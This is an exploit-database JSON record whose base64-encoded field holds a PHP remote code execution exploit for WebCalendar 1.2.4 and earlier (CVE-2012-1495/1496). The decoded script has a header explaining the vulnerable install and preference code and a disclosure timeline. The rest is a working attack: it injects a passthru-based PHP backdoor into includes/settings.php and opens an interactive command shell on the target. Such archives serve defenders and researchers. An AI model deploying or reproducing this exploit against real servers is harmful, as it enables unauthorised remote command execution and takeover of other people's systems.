{
    "source": "exploit-database", 
    "exploit": "PD9waHANCg0KLyoNCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KICAgIFdlYkNhbGVuZGFyIDw9IDEuMi40IChpbnN0YWxsL2luZGV4LnBocCkgUmVtb3RlIENvZGUgRXhlY3V0aW9ubiBFeHBsb2l0DQogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiAgICANCiAgICBhdXRob3IuLi4uLi4uLi4uOiBFZ2lkaW8gUm9tYW5vIGFrYSBFZ2lYDQogICAgbWFpbC4uLi4uLi4uLi4uLjogbjBiMGQxM3NbYXRdZ21haWxbZG90XWNvbQ0KICAgIHNvZnR3YXJlIGxpbmsuLi46IGh0dHBzOi8vc291cmNlZm9yZ2UubmV0L3Byb2plY3RzL3dlYmNhbGVuZGFyLw0KDQogICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogICAgfCBUaGlzIHByb29mIG9mIGNvbmNlcHQgY29kZSB3YXMgd3JpdHRlbiBmb3IgZWR1Y2F0aW9uYWwgcHVycG9zZSBvbmx5LiAgICB8DQogICAgfCBVc2UgaXQgYXQgeW91ciBvd24gcmlzay4gQXV0aG9yIHdpbGwgYmUgbm90IHJlc3BvbnNpYmxlIGZvciBhbnkgZGFtYWdlLiB8DQogICAgKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rDQogICAgDQogICAgWy1dIHZ1bG5lcmFibGUgY29kZSBpbiAvaW5zdGFsbC9pbmRleC5waHAgKENWRS0yMDEyLTE0OTUpDQoNCiAgICA2NzQuICAgICR5ID0gZ2V0UG9zdFZhbHVlICggJ2FwcF9zZXR0aW5ncycgKTsNCiAgICA2NzUuICAgIGlmICggISBlbXB0eSAoICR5ICkgKSB7DQogICAgNjc2LiAgICAgICRzZXR0aW5nc1snc2luZ2xlX3VzZXJfbG9naW4nXSA9IGdldFBvc3RWYWx1ZSAoICdmb3JtX3NpbmdsZV91c2VyX2xvZ2luJyApOw0KICAgIDY3Ny4gICAgICAkc2V0dGluZ3NbJ3JlYWRvbmx5J10gPSBnZXRQb3N0VmFsdWUgKCAnZm9ybV9yZWFkb25seScgKTsNCiAgICAuLi4NCiAgICA3MjQuICAgICAgLy8gU2F2ZSBzZXR0aW5ncyB0byBmaWxlIG5vdy4NCiAgICA3MjUuICAgIGlmICggISBlbXB0eSAoICR4ICkgfHwgISBlbXB0eSAoICR5ICkgKXsNCiAgICA3MjYuICAgICAgJGZkID0gQGZvcGVuICggJGZpbGUsICd3K2InLCBmYWxzZSApOw0KICAgIDcyNy4gICAgICBpZiAoIGVtcHR5ICggJGZkICkgKSB7DQogICAgNzI4LiAgICAgICAgaWYgKCBAZmlsZV9leGlzdHMgKCAkZmlsZSApICkgew0KICAgIDcyOS4gICAgICAgICAgJG9ubG9hZERldGFpbFN0ciA9DQogICAgNzMwLiAgICAgICAgICAgIHRyYW5zbGF0ZSAoICdQbGVhc2UgY2hhbmdlIHRoZSBmaWxlIHBlcm1pc3Npb25zIG9mIHRoaXMgZmlsZScsIHRydWUgKTsNCiAgICA3MzEuICAgICAgICB9IGVsc2Ugew0KICAgIDczMi4gICAgICAgICAgJG9ubG9hZERldGFpbFN0ciA9DQogICAgNzMzLiAgICAgICAgICAgIHRyYW5zbGF0ZSAoICdQbGVhc2UgY2hhbmdlIGluY2x1ZGVzIGRpciBwZXJtaXNzaW9uJywgdHJ1ZSApOw0KICAgIDczNC4gICAgICAgIH0NCiAgICA3MzUuICAgICAgICAkb25sb2FkID0gImFsZXJ0KCciIC4gJGVycm9yRmlsZVdyaXRlU3RyIC4gJGZpbGUuICJcXG4iIC4NCiAgICA3MzYuICAgICAgICAgICRvbmxvYWREZXRhaWxTdHIgLiAiLicpOyI7DQogICAgNzM3LiAgICAgIH0gZWxzZSB7DQogICAgNzM4LiAgICAgICAgaWYgKCBmdW5jdGlvbl9leGlzdHMgKCAiZGF0ZV9kZWZhdWx0X3RpbWV6b25lX3NldCIgKSApDQogICAgNzM5LiAgICAgICAgICBkYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0ICggIkFtZXJpY2EvTmV3X1lvcmsiKTsNCiAgICA3NDAuICAgICAgICBmd3JpdGUgKCAkZmQsICI8P3BocFxyXG4iICk7DQogICAgNzQxLiAgICAgICAgZndyaXRlICggJGZkLCAnLyogdXBkYXRlZCB2aWEgaW5zdGFsbC9pbmRleC5waHAgb24gJyAuIGRhdGUgKCAncicgKSAuICJcclxuIiApOw0KICAgIDc0Mi4gICAgICAgIGZvcmVhY2ggKCAkc2V0dGluZ3MgYXMgJGsgPT4gJHYgKSB7DQogICAgNzQzLiAgICAgICAgICBpZiAoICR2ICE9ICc8YnIgLz4nICYmICR2ICE9ICcnICkNCiAgICA3NDQuICAgICAgICAgIGZ3cml0ZSAoICRmZCwgJGsgLiAnOiAnIC4gJHYgLiAiXHJcbiIgKTsNCiAgICA3NDUuICAgICAgICB9DQogICAgDQogICAgUmVzdHJpY3RlZCBhY2Nlc3MgIHRvIHRoaXMgc2NyaXB0IGlzbid0ICBwcm9wZXJseSByZWFsaXplZCwgIHNvIGFuIGF0dGFja2VyIG1pZ2h0IGJlIGFibGUNCiAgICB0byAgdXBkYXRlICAvaW5jbHVkZXMvc2V0dGluZ3MucGhwICB3aXRoIGFyYml0cmFyeSAgdmFsdWVzICBvciAgaW5qZWN0IFBIUCBjb2RlICBpbnRvIGl0Lg0KICAgIA0KICAgIFstXSB2dWxuZXJhYmxlIGNvZGUgdG8gTEZJIGluIC9wcmVmLnBocCAoQ1ZFLTIwMTItMTQ5NikNCiAgICAgICAgDQogICAgNzAuICAgIGlmICggISBlbXB0eSAoICRfUE9TVCApICYmIGVtcHR5ICggJGVycm9yICkpIHsNCiAgICA3MS4gICAgICAkbXlfdGhlbWUgPSAnJzsNCiAgICA3Mi4gICAgICAkY3VycmVudHRhYiA9IGdldFBvc3RWYWx1ZSAoICdjdXJyZW50dGFiJyApOw0KICAgIDczLiAgICAgIHNhdmVfcHJlZiAoICRfUE9TVCwgJ3Bvc3QnICk7DQogICAgNzQuICAgIA0KICAgIDc1LiAgICAgIGlmICggISBlbXB0eSAoICRteV90aGVtZSApICkgew0KICAgIDc2LiAgICAgICAgJHRoZW1lID0gJ3RoZW1lcy8nLiAkbXlfdGhlbWUgLiAnX3ByZWYucGhwJzsNCiAgICA3Ny4gICAgICAgIGluY2x1ZGVfb25jZSAkdGhlbWU7DQogICAgNzguICAgICAgICBzYXZlX3ByZWYgKCAkd2ViY2FsX3RoZW1lLCAndGhlbWUnICk7DQogICAgNzkuICAgICAgfQ0KICAgIA0KICAgIElucHV0IHBhc3NlZCB0aHJvdWdoICRfUE9TVFsncHJlZl9USEVNRSddIGlzbid0IHByb3Blcmx5IHNhbml0aXplZCAgYmVmb3JlIGJlaW5nIGFzc2lnbmVkDQogICAgdG8gJG15X3RoZW1lIHZhcmlhYmxlLCB0aGlzIGNhbiBiZSBleHBsb2l0ZWQgdG8gaW5jbHVkZSBhcmJpdHJhcnkgbG9jYWwgZmlsZXMgYXQgbGluZSA3Ny4NCiAgICBFeHBsb2l0YXRpb24gIG9mIHRoaXMgIHZ1bG5lcmFiaWxpdHkgcmVxdWlyZXMgIGF1dGhlbnRpY2F0aW9uIGFuZCBtYWdpY19xdW90ZXNfZ3BjID0gb2ZmLg0KICAgIA0KICAgIFstXSBEaXNjbG9zdXJlIHRpbWVsaW5lOg0KICAgIA0KICAgIFswMi8xMC8yMDExXSAtIFZ1bG5lcmFiaWxpdGllcyBkaXNjb3ZlcmVkDQogICAgWzA0LzEwLzIwMTFdIC0gVmVuZG9yIG5vdGlmaWVkIHRvIGh0dHA6Ly9zb3VyY2Vmb3JnZS5uZXQvc3VwcG9ydC90cmFja2VyLnBocD9haWQ9MzQxODU3MA0KICAgIFsyMC8wMi8yMDEyXSAtIEZpcnN0IHZlbmRvciByZXNwb25zZQ0KICAgIFsyOC8wMi8yMDEyXSAtIFZlbmRvciBmaXggY29tbWl0dGVkIHRvIENWUw0KICAgIFsyOS8wMi8yMDEyXSAtIFZlcnNpb24gMS4yLjUgcmVsZWFzZWQNCiAgICBbMDIvMDMvMjAxMl0gLSBDVkUgbnVtYmVycyByZXF1ZXN0ZWQNCiAgICBbMDIvMDMvMjAxMl0gLSBBc3NpZ25lZCBDVkUtMjAxMi0xNDk1IGFuZCBDVkUtMjAxMi0xNDk2DQogICAgWzIzLzA0LzIwMTJdIC0gUHVibGljIGRpc2Nsb3N1cmUNCiAgICANCiovDQoNCmVycm9yX3JlcG9ydGluZygwKTsNCnNldF90aW1lX2xpbWl0KDApOw0KaW5pX3NldCgiZGVmYXVsdF9zb2NrZXRfdGltZW91dCIsIDUpOw0KDQpmdW5jdGlvbiBodHRwX3NlbmQoJGhvc3QsICRwYWNrZXQpDQp7DQogICAgaWYgKCEoJHNvY2sgPSBmc29ja29wZW4oJGhvc3QsIDgwKSkpIGRpZSggIlxuWy1dIE5vIHJlc3BvbnNlIGZyb20geyRob3N0fTo4MFxuIik7DQogICAgZndyaXRlKCRzb2NrLCAkcGFja2V0KTsNCiAgICByZXR1cm4gc3RyZWFtX2dldF9jb250ZW50cygkc29jayk7DQp9DQoNCnByaW50ICJcbistLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyI7DQpwcmludCAiXG58IFdlYkNhbGVuZGFyIDw9IDEuMi40IFJlbW90ZSBDb2RlIEV4ZWN1dGlvbm4gRXhwbG9pdCBieSBFZ2lYIHwiOw0KcHJpbnQgIlxuKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rXG4iOw0KDQppZiAoJGFyZ2MgPCAzKQ0Kew0KICAgIHByaW50ICJcblVzYWdlLi4uLi4uOiBwaHAgJGFyZ3ZbMF0gPGhvc3Q+IDxwYXRoPlxuIjsNCiAgICBwcmludCAiXG5FeGFtcGxlLi4uLjogcGhwICRhcmd2WzBdIGxvY2FsaG9zdCAvIjsNCiAgICBwcmludCAiXG5FeGFtcGxlLi4uLjogcGhwICRhcmd2WzBdIGxvY2FsaG9zdCAvd2ViY2FsZW5kYXIvXG4iOw0KICAgIGRpZSgpOw0KfQ0KDQpsaXN0KCRob3N0LCAkcGF0aCkgPSBhcnJheSgkYXJndlsxXSwgJGFyZ3ZbMl0pOw0KDQokcGhwY29kZSA9ICIqL3ByaW50KF9fX18pO3Bhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoXCRfU0VSVkVSW0hUVFBfQ01EXSkpO2RpZTsiOw0KJHBheWxvYWQgPSAiYXBwX3NldHRpbmdzPTEmZm9ybV91c2VyX2luYz11c2VyLnBocCZmb3JtX3NpbmdsZV91c2VyX2xvZ2luPXskcGhwY29kZX0iOw0KDQokcGFja2V0ICA9ICJQT1NUIHskcGF0aH1pbnN0YWxsL2luZGV4LnBocCBIVFRQLzEuMFxyXG4iOw0KJHBhY2tldCAuPSAiSG9zdDogeyRob3N0fVxyXG4iOw0KJHBhY2tldCAuPSAiQ29udGVudC1MZW5ndGg6ICIuc3RybGVuKCRwYXlsb2FkKS4iXHJcbiI7DQokcGFja2V0IC49ICJDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZFxyXG4iOw0KJHBhY2tldCAuPSAiQ29ubmVjdGlvbjogY2xvc2VcclxuXHJcbnskcGF5bG9hZH0iOw0KICAgIA0KaHR0cF9zZW5kKCRob3N0LCAkcGFja2V0KTsNCg0KJHBhY2tldCAgPSAiR0VUIHskcGF0aH1pbmNsdWRlcy9zZXR0aW5ncy5waHAgSFRUUC8xLjBcclxuIjsNCiRwYWNrZXQgLj0gIkhvc3Q6IHskaG9zdH1cclxuIjsNCiRwYWNrZXQgLj0gIkNtZDogJXNcclxuIjsNCiRwYWNrZXQgLj0gIkNvbm5lY3Rpb246IGNsb3NlXHJcblxyXG4iOw0KDQp3aGlsZSgxKQ0Kew0KICAgIHByaW50ICJcbndlYmNhbGVuZGFyLXNoZWxsIyAiOw0KICAgIGlmICgoJGNtZCA9IHRyaW0oZmdldHMoU1RESU4pKSkgPT0gImV4aXQiKSBicmVhazsNCiAgICAkcmVzcG9uc2UgPSBodHRwX3NlbmQoJGhvc3QsIHNwcmludGYoJHBhY2tldCwgYmFzZTY0X2VuY29kZSgkY21kKSkpOw0KICAgIHByZWdfbWF0Y2goJy9fX19fKC4qKS9zJywgJHJlc3BvbnNlLCAkbSkgPyBwcmludCAkbVsxXSA6IGRpZSgiXG5bLV0gRXhwbG9pdCBmYWlsZWQhXG4iKTsNCn0=", 
    "filename": "platforms/php/webapps/18775.php", 
    "id": "18775", 
    "cves": [
        "CVE-2012-1496", 
        "CVE-2012-1495"
    ]
}